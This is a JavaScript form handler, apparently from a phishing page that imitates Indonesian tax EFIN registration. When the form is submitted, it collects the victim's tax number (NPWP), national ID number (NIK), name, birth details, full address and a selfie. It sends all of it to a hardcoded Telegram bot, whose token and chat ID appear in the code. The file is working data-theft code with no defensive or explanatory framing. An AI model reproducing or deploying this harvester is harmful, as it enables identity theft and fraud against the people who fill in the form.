document.getElementById('efinForm').addEventListener('submit', function(e) {
    e.preventDefault();

    // Mengambil nilai dari form
    const npwp = document.getElementById('npwp').value;
    const nik = document.getElementById('nik').value;
    const nama = document.getElementById('nama').value;
    const tempatLahir = document.getElementById('tempatLahir').value;
    const tglLahir = document.getElementById('tglLahir').value;
    const alamat = document.getElementById('alamat').value;
    const rt = document.getElementById('rt').value;
    const rw = document.getElementById('rw').value;
    const kelurahan = document.getElementById('kelurahan').value;
    const kecamatan = document.getElementById('kecamatan').value;
    const kota = document.getElementById('kota').value;

    // Menyiapkan pesan untuk Telegram
    const message = `
📝 *FORMULIR EFIN BARU*
---------------------------
NPWP: ${npwp}
NIK: ${nik}
Nama: ${nama}
Tempat Lahir: ${tempatLahir}
Tanggal Lahir: ${tglLahir}
Alamat: ${alamat}
RT: ${rt}
RW: ${rw}
Kelurahan: ${kelurahan}
Kecamatan: ${kecamatan}
Kota/Kabupaten: ${kota}
`;

    // Konfigurasi Bot Telegram
    const botToken = '7892360127:AAFrvXO4PxaPDQx4JE2RTCW5FJaeHOOUJ6c';
    const chatId = '156619417';
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Mengirim data ke Telegram
    fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('Formulir berhasil dikirim!');
            document.getElementById('efinForm').reset();
        } else {
            alert('Terjadi kesalahan saat mengirim formulir. Silakan coba lagi.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Terjadi kesalahan saat mengirim formulir. Silakan coba lagi.');
    });

    // Handle foto selfie
    const selfieInput = document.getElementById('selfie');
    if (selfieInput.files && selfieInput.files[0]) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', selfieInput.files[0]);
        formData.append('caption', `Foto Selfie - ${nama} (${npwp})`);

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (!data.ok) {
                alert('Terjadi kesalahan saat mengirim foto. Silakan coba lagi.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Terjadi kesalahan saat mengirim foto. Silakan coba lagi.');
        });
    }
}); 